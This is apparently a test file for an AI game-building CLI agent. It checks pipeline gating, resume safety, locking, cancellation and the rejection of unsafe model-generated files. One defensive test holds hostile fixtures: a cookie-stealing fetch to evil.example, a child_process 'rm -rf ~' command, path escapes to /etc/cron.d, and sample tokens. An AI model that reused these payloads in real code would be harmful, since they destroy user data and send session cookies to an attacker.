// Orchestration tests use a scripted provider and a MOCKED playtest runner (kind "mock"). They
// verify control flow, gates and safety; real browser QA lives in agent-browser.test.mjs.
import test from 'node:test';
import assert from 'node:assert/strict';
import { PassThrough } from 'node:stream';
import { appendFileSync } from 'node:fs';
import { appendFile, mkdir, readdir, readFile, writeFile, lstat, chmod, link, rename, symlink } from 'node:fs/promises';
import { createHash } from 'node:crypto';
import { hostname } from 'node:os';
import { join } from 'node:path';
import agent from '../commands/agent.mjs';
import { ARCHITECTURE, GAME_FILES, PLAN, SKILLS, blank, fakeDeploy, goodObservations, implementation, mockRunner, scriptedProvider, tmp } from './agent-fixtures.test.mjs';

const sink = () => { const chunks = []; return { chunks, write(chunk) { chunks.push(String(chunk)); return true; }, text: () => chunks.join('') }; };
const exists = path => lstat(path).then(() => true, () => false);

function setup(t, extra = {}) {
  const provider = extra.provider ?? scriptedProvider(extra.outputs);
  const playtest = extra.playtest ?? mockRunner();
  const stdout = sink(), stderr = sink();
  const events = [];
  const controller = extra.controller ?? new AbortController();
  return {
    provider, playtest, stdout, stderr, events, controller,
    async run(args, more = {}) {
      const cwd = more.cwd ?? this.cwd ?? (this.cwd = await tmp(t));
      return agent(args, { cwd, signal: controller.signal, stdout, stderr, interactive: false, provider, playtest, engine: null, onEvent: event => events.push(event), ...extra.context, ...more });
    },
  };
}
async function rejectsCode(promise, expected) {
  let caught;
  await assert.rejects(promise, error => { caught = error; return true; });
  assert.equal(caught.code, expected, `expected ${expected}, got ${caught.code} ${caught.stack}`);
  return caught;
}
const runs = async cwd => (await readdir(join(cwd, '.zukujs', 'agent', 'runs')));
const receiptOf = async cwd => { const [id] = await runs(cwd); return JSON.parse(await readFile(join(cwd, '.zukujs', 'agent', 'runs', id, 'receipt.json'), 'utf8')); };

test('local run: plan → implement → validated project → playtest → package, never publishes', async t => {
  const env = setup(t);
  const deploy = fakeDeploy();
  const result = await env.run(['a lane dodging arcade game'], { deploy });
  assert.equal(result.status, 'packaged');
  assert.equal(result.published, false);
  assert.equal(deploy.calls.preflight + deploy.calls.run.length, 0, 'local mode never touches deploy');
  assert.deepEqual(env.provider.calls.map(call => call.stage), ['design', 'architecture', 'implementation', 'playtest', 'publish']);
  for (const call of env.provider.calls) {
    assert.equal(call.experimental, true);
    assert.ok(call.instructions.includes(SKILLS.get({ design: 'game-design', architecture: 'game-architecture', implementation: 'game-implementation', playtest: 'game-playtest', publish: 'game-publish' }[call.stage]).body));
    assert.ok(call.outputSchema && call.signal);
  }
  const root = join(env.cwd, 'lane-dodger');
  assert.equal(result.project.path, root);
  const manifest = JSON.parse(await readFile(join(root, 'zukujs.json'), 'utf8'));
  assert.equal(manifest.title, 'Lane Dodger');
  assert.equal(manifest.jump.genre, 'arcade');
  assert.equal(await readFile(join(root, 'src', 'simulation.js'), 'utf8'), GAME_FILES['src/simulation.js']);
  assert.ok(!(await exists(join(root, 'src', 'game.js'))), 'scaffold game replaced by generated files');
  const pkg = await readFile(result.package.path);
  assert.equal(createHash('sha256').update(pkg).digest('hex'), result.package.sha256);
  const receipt = await receiptOf(env.cwd);
  assert.equal(receipt.state, 'packaged');
  assert.equal(receipt.stages.length, 5);
  assert.ok(receipt.stages.every(stage => stage.skill.sha256.length === 64 && stage.source === 'model' && stage.status === 'accepted'));
  assert.equal(receipt.playtest.runner, 'injected', 'mocked runner is never recorded as a real browser');
  assert.equal(receipt.digests.package_sha256, result.package.sha256);
  const text = await readFile(join(env.cwd, '.zukujs', 'agent', 'runs', receipt.run_id, 'receipt.json'), 'utf8');
  assert.ok(!text.includes('lane dodging arcade game'), 'request text is never stored');
  assert.equal(env.stdout.text(), '', 'agent writes no data to stdout');
  assert.match(env.stderr.text(), /\[zukujs agent\] 설계\(design\) 시작/);
  assert.ok(!(await exists(join(env.cwd, '.zukujs', 'agent', 'run.lock'))), 'lock released');
  assert.ok(env.events.every(event => Object.values(event).every(value => typeof value !== 'object')));
});

test('yolo: quota preflight happens before any model call, then one publish with the real thumbnail', async t => {
  const order = [];
  const deploy = fakeDeploy();
  const preflight = deploy.preflight;
  deploy.preflight = async (...args) => { order.push('preflight'); return preflight(...args); };
  const provider = scriptedProvider();
  const runStage = provider.runStage;
  provider.runStage = async request => { order.push(request.stage); return runStage(request); };
  const env = setup(t, { provider });
  const result = await env.run(['lane game', '--yolo'], { deploy });
  assert.equal(order[0], 'preflight');
  assert.equal(result.status, 'published');
  assert.equal(result.publish.content_id, 'cnt_test123');
  assert.equal(deploy.calls.run.length, 1);
  const call = deploy.calls.run[0];
  assert.equal(call.path, result.package.path);
  assert.equal(call.options.yolo, true);
  assert.equal(call.options.package_sha256, result.package.sha256);
  const thumbnail = await readFile(call.options.thumbnail.path);
  assert.equal(createHash('sha256').update(thumbnail).digest('hex'), call.options.thumbnail.sha256);
  assert.ok(call.options.thumbnail.path.includes(join('.zukujs', 'agent', 'runs')), 'thumbnail stays outside packaged source');
  assert.equal((await receiptOf(env.cwd)).state, 'published');
});

test('official authentication remains official throughout all five stages', async t => {
  const provider = scriptedProvider();
  const runStage = provider.runStage;
  provider.runStage = async request => ({ ...(await runStage(request)), experimental: false, unofficial: false });
  const env = setup(t, { provider });
  const result = await env.run(['a ZUKU lane game']);
  assert.equal(result.provider.experimental, false);
  assert.equal(result.provider.unofficial, false);
  assert.ok((await receiptOf(env.cwd)).stages.every(stage => stage.experimental === false && stage.unofficial === false));
});

test('resume refuses parent symlinks before reading or writing an outside receipt', async t => {
  const env = setup(t);
  const local = await env.run(['a ZUKU lane game']);
  const directory = join(env.cwd, '.zukujs', 'agent', 'runs', local.run_id);
  const outside = await tmp(t);
  const target = join(outside, 'escaped-run');
  await rename(directory, target);
  const before = await readFile(join(target, 'receipt.json'));
  await symlink(target, directory, 'dir');
  await rejectsCode(env.run(['--resume', local.run_id]), 'AGENT_RESUME_INVALID');
  assert.deepEqual(await readFile(join(target, 'receipt.json')), before);
  assert.equal(env.playtest.calls.length, 1);
  assert.equal(env.provider.calls.length, 5);
});

test('resume refuses outside project names and mismatched current skill receipts before tools', async t => {
  for (const mutation of [
    receipt => { receipt.project.name = '../outside-game'; },
    receipt => { receipt.skill_pack.sha256 = '0'.repeat(64); },
    receipt => { receipt.skills[0].sha256 = '0'.repeat(64); },
  ]) {
    const env = setup(t);
    const local = await env.run(['a ZUKU lane game']);
    const path = join(env.cwd, '.zukujs', 'agent', 'runs', local.run_id, 'receipt.json');
    const receipt = JSON.parse(await readFile(path, 'utf8'));
    mutation(receipt);
    await writeFile(path, JSON.stringify(receipt));
    await rejectsCode(env.run(['--resume', local.run_id]), 'AGENT_RESUME_INVALID');
    assert.equal(env.playtest.calls.length, 1);
    assert.equal(env.provider.calls.length, 5);
  }
});

test('resume refuses hardlinked and public-readable receipt files', { skip: process.platform === 'win32' }, async t => {
  for (const linked of [true, false]) {
    const env = setup(t);
    const local = await env.run(['a ZUKU lane game']);
    const path = join(env.cwd, '.zukujs', 'agent', 'runs', local.run_id, 'receipt.json');
    if (linked) await link(path, join(env.cwd, 'receipt-alias.json'));
    else await chmod(path, 0o644);
    await rejectsCode(env.run(['--resume', local.run_id]), 'AGENT_RESUME_INVALID');
    assert.equal(env.playtest.calls.length, 1);
  }
});

test('cancellation from publish progress stops before the deployment adapter', async t => {
  const controller = new AbortController();
  const env = setup(t, { controller });
  const deploy = fakeDeploy();
  await rejectsCode(env.run(['a ZUKU lane game', '--yolo'], { deploy, onEvent: event => {
    if (event.stage === 'deploy' && event.status === 'started') controller.abort();
  } }), 'COMMAND_CANCELLED');
  assert.equal(deploy.calls.run.length, 0);
  assert.equal((await receiptOf(env.cwd)).state, 'cancelled');
});

test('cancellation from draft progress stops before the upload adapter', async t => {
  const controller = new AbortController();
  const env = setup(t, { controller });
  let uploads = 0;
  await rejectsCode(env.run(['a ZUKU lane game', '--draft'], { upload: async () => { uploads++; }, onEvent: event => {
    if (event.stage === 'upload' && event.status === 'started') controller.abort();
  } }), 'COMMAND_CANCELLED');
  assert.equal(uploads, 0);
  assert.equal((await receiptOf(env.cwd)).state, 'cancelled');
});

test('yolo: exhausted quota or failed account preflight spends no model tokens and writes nothing', async t => {
  const env = setup(t);
  const deploy = fakeDeploy({ quota: { limit: 3, window_seconds: 21600, used: 3, pending: 0, remaining: 0, reset_at: '2026-10-03T18:00:00Z', retry_after: 5400 } });
  const error = await rejectsCode(env.run(['x', '--yolo'], { deploy }), 'DEPLOY_QUOTA_EXCEEDED');
  assert.equal(error.details.retry_after, 5400);
  assert.equal(env.provider.calls.length, 0);
  assert.deepEqual(await readdir(env.cwd), []);
  const denied = fakeDeploy({ quota: Object.assign(new Error('raw 401 body'), { code: 'UNAUTHORIZED' }) });
  const unavailable = await rejectsCode(env.run(['x', '--yolo'], { deploy: denied }), 'AGENT_DEPLOY_UNAVAILABLE');
  assert.ok(!JSON.stringify(unavailable.toJSON()).includes('raw 401'));
  await rejectsCode(env.run(['x', '--yolo'], { deploy: { preflight: async () => ({ quota: { remaining: 'lots' } }), run: async () => {} } }), 'AGENT_DEPLOY_UNAVAILABLE');
  assert.equal(env.provider.calls.length, 0);
});

test('failed real-playtest verdict: one repair, then no package, upload or publish', async t => {
  const playtest = mockRunner(() => goodObservations({ page_errors: 1, error_samples: ['TypeError: x is undefined'] }));
  const env = setup(t, { playtest });
  const deploy = fakeDeploy();
  const error = await rejectsCode(env.run(['x', '--yolo'], { deploy }), 'AGENT_PLAYTEST_FAILED');
  assert.deepEqual(error.details.codes, ['PT_PAGE_ERROR']);
  assert.equal(deploy.calls.run.length, 0);
  assert.equal(playtest.calls.length, 2);
  const repair = env.provider.calls.filter(call => call.stage === 'implementation')[1];
  assert.deepEqual(repair.input.repair.failures, ['PT_PAGE_ERROR']);
  assert.ok(!env.provider.calls.some(call => call.stage === 'publish'));
  assert.ok(await exists(join(env.cwd, 'lane-dodger', 'src', 'index.html')), 'editable project kept');
  assert.ok(!(await exists(join(env.cwd, 'lane-dodger', 'dist'))), 'never packaged');
  assert.equal((await receiptOf(env.cwd)).state, 'playtest_failed');
});

test('playtest verdicts are computed from observations, not runner claims', async t => {
  for (const [patch, codeExpected] of [
    [{ passed: true, thumbnail: blank, frames: [blank, blank] }, 'PT_RENDER_STATIC'],
    [{ blocked_requests: 2 }, 'PT_EXTERNAL_REQUEST'],
    [{ browser: { name: 'chromium', version: 'x', sandbox: false } }, 'PT_NOT_BROWSER'],
    [{ kind: 'model-review' }, 'PT_NOT_BROWSER'],
    [{ states: { ...goodObservations().states, after_reset: { status: 'over', score: 0, tick: 186, last_action: 'reset' } } }, 'PT_RESET_INPUT_NO_EFFECT'],
    [{ states: { ...goodObservations().states, after_start: { status: 'menu', score: 0, tick: 0, last_action: null } } }, 'PT_START_INPUT_NO_EFFECT'],
    [{ hook_present: false }, 'PT_HOOK_MISSING'],
  ]) {
    const env = setup(t, { playtest: mockRunner(() => goodObservations(patch)) });
    const error = await rejectsCode(env.run(['x']), 'AGENT_PLAYTEST_FAILED');
    assert.ok(error.details.codes.includes(codeExpected), `${codeExpected} in ${error.details.codes}`);
  }
});

test('repair succeeds: second implementation passes and the run publishes once', async t => {
  const playtest = mockRunner((input, n) => goodObservations(n === 1 ? { failed_requests: 1 } : {}));
  const env = setup(t, { playtest });
  const deploy = fakeDeploy();
  const result = await env.run(['x', '--yolo'], { deploy });
  assert.equal(result.status, 'published');
  assert.equal(deploy.calls.run.length, 1);
  assert.equal(env.provider.calls.filter(call => call.stage === 'implementation').length, 2);
});

test('publish outcome unknown (timeout): no automatic retry, recovery query required before republish', async t => {
  const env = setup(t);
  const deploy = fakeDeploy({ run: async () => { throw Object.assign(new Error('socket hang up with token=abc'), { ambiguous: true }); } });
  const error = await rejectsCode(env.run(['x', '--yolo'], { deploy }), 'AGENT_PUBLISH_OUTCOME_UNKNOWN');
  assert.equal(deploy.calls.run.length, 1);
  assert.ok(!JSON.stringify(error.toJSON()).includes('hang up'));
  const receipt = await receiptOf(env.cwd);
  assert.equal(receipt.state, 'publish_outcome_unknown');
  const resume = ['--resume', receipt.run_id, '--yolo'];
  // No recovery capability: refuse, never re-send.
  await rejectsCode(env.run(resume, { deploy }), 'AGENT_RECOVERY_REQUIRED');
  assert.equal(deploy.calls.run.length, 1);
  // Recovery reports the server committed it: record success, no second mutation.
  const recovered = fakeDeploy({ recover: async () => ({ status: 'published', content_id: 'cnt_recovered' }) });
  const result = await env.run(resume, { deploy: recovered });
  assert.equal(result.status, 'published');
  assert.equal(result.publish.content_id, 'cnt_recovered');
  assert.equal(recovered.calls.run.length, 0);
  // Already published: resume is a no-op.
  assert.equal((await env.run(resume, { deploy: recovered })).status, 'published');
  assert.equal(recovered.calls.run.length, 0);
});

test('resume after a definite not-published recovery revalidates, re-playtests and publishes once', async t => {
  const env = setup(t);
  const first = fakeDeploy({ run: async () => { const e = new Error('timeout'); e.name = 'TimeoutError'; throw e; } });
  await rejectsCode(env.run(['x', '--yolo'], { deploy: first }), 'AGENT_PUBLISH_OUTCOME_UNKNOWN');
  const receipt = await receiptOf(env.cwd);
  const deploy = fakeDeploy({ recover: async () => ({ status: 'not_published' }) });
  const before = env.playtest.calls.length;
  const result = await env.run(['--resume', receipt.run_id, '--yolo'], { deploy });
  assert.equal(result.status, 'published');
  assert.equal(deploy.calls.recover, 1);
  assert.equal(deploy.calls.preflight, 1);
  assert.equal(deploy.calls.run.length, 1);
  assert.equal(env.playtest.calls.length, before + 1, 'resume re-runs the playtest');
  assert.equal(env.provider.calls.length, 5, 'resume spends no model calls');
});

test('stale resume: edited sources fail the digest gate and are never published', async t => {
  const env = setup(t);
  const local = await env.run(['x']);
  await appendFile(join(local.project.path, 'src', 'render.js'), '\n// edited\n');
  const deploy = fakeDeploy();
  await rejectsCode(env.run(['--resume', local.run_id, '--yolo'], { deploy }), 'AGENT_SOURCE_CHANGED');
  assert.equal(deploy.calls.run.length, 0);
  await rejectsCode(env.run(['--resume', 'run_20990101000000_deadbeef']), 'AGENT_RESUME_INVALID');
});

test('definite rejections are recorded and consume no retry; 429 maps to quota exceeded', async t => {
  const env = setup(t);
  const rejected = fakeDeploy({ run: async () => { throw Object.assign(new Error('bad'), { httpStatus: 422, code: 'PACKAGE_REJECTED', definite: true }); } });
  await rejectsCode(env.run(['x', '--yolo'], { deploy: rejected }), 'AGENT_PUBLISH_REJECTED');
  assert.equal((await receiptOf(env.cwd)).state, 'publish_rejected');
  const env2 = setup(t);
  const limited = fakeDeploy({ run: async () => { throw Object.assign(new Error('429'), { httpStatus: 429, code: 'DEPLOY_QUOTA_EXCEEDED', retry_after: 120 }); } });
  const error = await rejectsCode(env2.run(['x', '--yolo'], { deploy: limited }), 'DEPLOY_QUOTA_EXCEEDED');
  assert.equal(error.details.retry_after, 120);
  assert.equal(limited.calls.run.length, 1);
});

test('cancellation: before or during work publishes nothing and releases the claim and lock', async t => {
  const controller = new AbortController();
  const provider = scriptedProvider({ implementation: () => { controller.abort(); return implementation(); } });
  const env = setup(t, { provider, controller });
  const deploy = fakeDeploy();
  await rejectsCode(env.run(['x', '--yolo'], { deploy }), 'COMMAND_CANCELLED');
  assert.equal(deploy.calls.run.length, 0);
  assert.ok(!(await exists(join(env.cwd, 'lane-dodger'))), 'claimed project directory released');
  assert.ok(!(await exists(join(env.cwd, '.zukujs', 'agent', 'run.lock'))));
  assert.equal((await receiptOf(env.cwd)).state, 'cancelled');
  // Cancelled while the publish request is in flight: unknown outcome, never retried.
  const controller2 = new AbortController();
  const env2 = setup(t, { controller: controller2 });
  const inflight = fakeDeploy({ run: async () => { controller2.abort(); throw new Error('aborted'); } });
  await rejectsCode(env2.run(['x', '--yolo'], { deploy: inflight }), 'AGENT_PUBLISH_OUTCOME_UNKNOWN');
  assert.equal(inflight.calls.run.length, 1);
  const pre = setup(t);
  await rejectsCode(pre.run(['x'], { signal: AbortSignal.abort() }), 'COMMAND_CANCELLED');
  assert.equal(pre.provider.calls.length, 0);
});

test('run lock: a concurrent orchestration in the same directory is refused; dead-process locks are reclaimed', async t => {
  const env = setup(t);
  env.cwd = await tmp(t);
  await mkdir(join(env.cwd, '.zukujs', 'agent'), { recursive: true, mode: 0o700 });
  const lock = join(env.cwd, '.zukujs', 'agent', 'run.lock');
  await writeFile(lock, JSON.stringify({ pid: process.pid, run_id: 'run_20261003000000_00000000', host: hostname() }), { mode: 0o600 });
  await rejectsCode(env.run(['x']), 'AGENT_BUSY');
  assert.equal(env.provider.calls.length, 0);
  await writeFile(lock, JSON.stringify({ pid: 2 ** 22 + 12345, run_id: 'run_20261003000000_00000000', host: hostname() }), { mode: 0o600 });
  assert.equal((await env.run(['x'])).status, 'packaged');
  // Two simultaneous runs: exactly one wins.
  const env2 = setup(t);
  env2.cwd = await tmp(t);
  const results = await Promise.allSettled([env2.run(['x', '--name', 'one']), env2.run(['x', '--name', 'two'])]);
  assert.deepEqual(results.map(item => item.status).sort(), ['fulfilled', 'rejected']);
  assert.equal(results.find(item => item.status === 'rejected').reason.code, 'AGENT_BUSY');
});

test('source digest gate: files changed after packaging block the publish', async t => {
  const deploy = fakeDeploy();
  const env = setup(t);
  env.cwd = await tmp(t);
  let tampered = false;
  const onEvent = event => {
    if (event.stage === 'package' && event.status === 'done' && !tampered) { tampered = true; appendFileSync(join(env.cwd, 'lane-dodger', 'src', 'main.js'), '\n// injected\n'); }
  };
  await rejectsCode(env.run(['x', '--yolo'], { deploy, onEvent }), 'AGENT_SOURCE_CHANGED');
  assert.equal(deploy.calls.run.length, 0);
  assert.equal((await receiptOf(env.cwd)).state, 'source_changed');
});

test('abusive model output: escapes, shell, network and secrets are refused without writing files', async t => {
  const cases = [
    [{ path: '../escape.js', content: 'x' }, 'ARTIFACT_PATH_UNSAFE'],
    [{ path: '/etc/cron.d/x', content: 'x' }, 'ARTIFACT_PATH_UNSAFE'],
    [{ path: 'src/.credentials.json', content: '{}' }, 'ARTIFACT_PATH_UNSAFE'],
    [{ path: 'src/vendor/phaser.min.js', content: 'evil' }, 'ARTIFACT_PATH_UNSAFE'],
    [{ path: 'zukujs.json', content: '{}' }, 'ARTIFACT_PATH_UNSAFE'],
    [{ path: 'src/hack.js', content: "require('child_process').exec('rm -rf ~')" }, 'ARTIFACT_COMMAND'],
    [{ path: 'src/hack.js', content: "fetch('https://evil.example/steal?c=' + document.cookie)" }, 'ARTIFACT_NETWORK'],
    [{ path: 'src/hack.js', content: 'const t = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U";' }, 'ARTIFACT_SECRET'],
  ];
  for (const [extra, expected] of cases) {
    const impl = implementation();
    impl.files.push(extra);
    const env = setup(t, { outputs: { implementation: impl } });
    const deploy = fakeDeploy();
    const error = await rejectsCode(env.run(['x', '--yolo'], { deploy }), 'AGENT_ARTIFACT_UNSAFE');
    assert.ok(error.details.codes.includes(expected), `${expected} in ${error.details.codes}`);
    assert.equal(env.provider.calls.filter(call => call.stage === 'implementation').length, 1, 'unsafe output is not retried');
    assert.equal(deploy.calls.run.length, 0);
    assert.ok(!(await exists(join(env.cwd, 'lane-dodger'))));
    assert.ok(!(await exists(join(env.cwd, '..', 'escape.js'))));
  }
});

test('skipped or forged skills and failed gates stop the run', async t => {
  const forged = { ...PLAN, skill_receipt: { name: 'game-design', version: '1.0.0', sha256: '0'.repeat(64) } };
  const env = setup(t, { outputs: { design: forged } });
  const error = await rejectsCode(env.run(['x']), 'AGENT_GATE_FAILED');
  assert.deepEqual(error.details.codes, ['SKILL_RECEIPT_MISMATCH']);
  assert.equal(env.provider.calls.length, 2, 'one revision attempt, then stop');
  assert.ok(env.provider.calls[1].input.gate_feedback.codes.includes('SKILL_RECEIPT_MISMATCH'));
  const noGameOver = { ...PLAN, menus: [PLAN.menus[0]] };
  const env2 = setup(t, { outputs: { design: noGameOver } });
  assert.ok((await rejectsCode(env2.run(['x']), 'AGENT_GATE_FAILED')).details.codes.includes('PLAN_GAME_OVER_MENU_MISSING'));
  const { skill_receipt, ...unclaimed } = PLAN;
  const env3 = setup(t, { outputs: { design: { ...unclaimed, skills_applied: true } } });
  await rejectsCode(env3.run(['x']), 'AGENT_STAGE_OUTPUT_INVALID');
  // A gate failure followed by a corrected revision continues.
  const env4 = setup(t, { outputs: { architecture: [{ ...ARCHITECTURE, input_mapping: [] }, ARCHITECTURE] } });
  assert.equal((await env4.run(['x'])).status, 'packaged');
  await rejectsCode(setup(t).run(['x', '--no-skills']), 'INVALID_INPUT');
});

test('budgets: oversized stage output and token overuse stop the run', async t => {
  const huge = implementation({ ...GAME_FILES, 'src/pad.txt': 'x'.repeat(500 * 1024), 'src/pad2.txt': 'x'.repeat(500 * 1024), 'src/pad3.txt': 'x'.repeat(500 * 1024), 'src/pad4.txt': 'x'.repeat(200 * 1024) });
  await rejectsCode(setup(t, { outputs: { implementation: huge } }).run(['x']), 'AGENT_BUDGET_EXCEEDED');
  const provider = scriptedProvider();
  const runStage = provider.runStage;
  provider.runStage = async request => ({ ...(await runStage(request)), usage: { input_tokens: 700_000, output_tokens: 1, total_tokens: 700_001 } });
  await rejectsCode(setup(t, { provider }).run(['x']), 'AGENT_BUDGET_EXCEEDED');
  const leaky = { runStage: async () => { throw Object.assign(new Error('500 internal: Bearer abcdefghijklmnopqrstuvwxyz123456'), { status: 500 }); } };
  const error = await rejectsCode(setup(t, { provider: leaky }).run(['x']), 'AGENT_PROVIDER_FAILED');
  assert.ok(!JSON.stringify(error.toJSON()).includes('Bearer'));
  await rejectsCode(setup(t, { provider: { runStage: async request => ({ stage: 'other', output: {}, experimental: true }) } }).run(['x']), 'AGENT_STAGE_OUTPUT_INVALID');
});

test('input handling: non-interactive never waits; interactive reads one line with cancellation', async t => {
  const env = setup(t);
  await rejectsCode(env.run([]), 'AGENT_REQUEST_REQUIRED');
  await rejectsCode(env.run(['token sk-proj-abcdefghijklmnopqrstuvwxyz123456']), 'AGENT_REQUEST_INVALID');
  assert.equal(env.provider.calls.length, 0);
  const stdin = new PassThrough();
  const pending = env.run([], { stdin, interactive: true });
  setTimeout(() => stdin.write('a three lane dodging game\n'), 20);
  assert.equal((await pending).status, 'packaged');
  assert.match(env.stderr.text(), /만들 게임을 한 줄로 설명하세요/);
  assert.equal(env.stdout.text(), '');
  const controller = new AbortController();
  const waiting = setup(t, { controller }).run([], { stdin: new PassThrough(), interactive: true });
  setTimeout(() => controller.abort(), 20);
  await rejectsCode(waiting, 'COMMAND_CANCELLED');
});

test('invalid inputs and existing projects are rejected before mutations or model calls', async t => {
  const env = setup(t);
  env.cwd = await tmp(t);
  await rejectsCode(env.run(['x', '--bogus']), 'INVALID_INPUT');
  assert.deepEqual(await readdir(env.cwd), []);
  await mkdir(join(env.cwd, 'taken'));
  await writeFile(join(env.cwd, 'taken', 'keep.txt'), 'mine');
  await rejectsCode(env.run(['x', '--name', 'taken']), 'AGENT_PROJECT_EXISTS');
  assert.equal(env.provider.calls.length, 0);
  assert.equal(await readFile(join(env.cwd, 'taken', 'keep.txt'), 'utf8'), 'mine');
  // A derived name that is taken gets a fresh suffix instead of overwriting.
  await mkdir(join(env.cwd, 'lane-dodger'));
  const result = await env.run(['x']);
  assert.equal(result.project.name, 'lane-dodger-2');
  assert.deepEqual(await readdir(join(env.cwd, 'lane-dodger')), []);
});

test('draft mode uploads through the injected upload adapter and never deploys', async t => {
  const env = setup(t);
  const uploads = [];
  const deploy = fakeDeploy();
  const upload = async (args, options) => {
    uploads.push(args);
    const { projectPackager } = await import('../lib/upload-project.mjs');
    const { bytes } = await projectPackager.packageProject(args[0], options);
    return { status: 'draft_created', content: { id: 'cnt_draft1' }, package: { sha256: createHash('sha256').update(bytes).digest('hex') }, receipt: { saved: true, path: '/tmp/r.json' } };
  };
  const result = await env.run(['x', '--draft'], { upload, deploy });
  assert.equal(result.status, 'draft_created');
  assert.equal(result.published, false);
  assert.equal(result.draft.content_id, 'cnt_draft1');
  assert.equal(uploads.length, 1);
  assert.equal(deploy.calls.preflight + deploy.calls.run.length, 0);
});

test('phaser engine: bundled local build is vendored, never a CDN', async t => {
  const phaserArch = { ...ARCHITECTURE, engine: { name: 'phaser', reason: 'Scenes and tweens help this game.', uses_create_scaffold: false } };
  const files = { ...GAME_FILES, 'src/index.html': GAME_FILES['src/index.html'].replace('<script type="module"', '<script src="vendor/phaser.min.js"></script>\n  <script type="module"') };
  const env = setup(t, { outputs: { architecture: phaserArch, implementation: implementation(files) } });
  const engine = { name: 'phaser', version: '3.90.0', bytes: Buffer.from('/* local phaser bundle */'), license: 'MIT License', sha256: 'f'.repeat(64) };
  const result = await env.run(['x'], { engine });
  assert.equal(await readFile(join(result.project.path, 'src', 'vendor', 'phaser.min.js'), 'utf8'), '/* local phaser bundle */');
  const receipt = await receiptOf(env.cwd);
  assert.deepEqual(receipt.engine.name, 'phaser');
  const input = env.provider.calls.find(call => call.stage === 'architecture').input;
  assert.deepEqual(input.available_engines, ['phaser', 'canvas']);
  // Without a bundle only canvas is offered and a phaser architecture is gated out.
  const env2 = setup(t, { outputs: { architecture: phaserArch } });
  assert.ok((await rejectsCode(env2.run(['x']), 'AGENT_GATE_FAILED')).details.codes.includes('ARCH_ENGINE_UNAVAILABLE'));
});

test('browser preparation failures stop the run before any model call or state write', async t => {
  const playtest = { kind: 'browser', prepare: async () => { const { AgentError } = await import('../lib/agent/errors.mjs'); throw new AgentError('AGENT_PLAYTEST_SANDBOX'); }, run: async () => { throw new Error('unreachable'); } };
  const env = setup(t, { playtest });
  env.cwd = await tmp(t);
  const deploy = fakeDeploy();
  await rejectsCode(env.run(['x', '--yolo'], { deploy }), 'AGENT_PLAYTEST_SANDBOX');
  assert.equal(env.provider.calls.length, 0);
  assert.deepEqual(await readdir(env.cwd), []);
});

test('state directory: a symlinked .zukujs/agent is refused', async t => {
  const { symlink } = await import('node:fs/promises');
  const env = setup(t);
  env.cwd = await tmp(t);
  const elsewhere = await tmp(t);
  await mkdir(join(env.cwd, '.zukujs'));
  await symlink(elsewhere, join(env.cwd, '.zukujs', 'agent'));
  await rejectsCode(env.run(['x']), 'AGENT_STATE_UNSAFE');
  assert.deepEqual(await readdir(elsewhere), []);
});
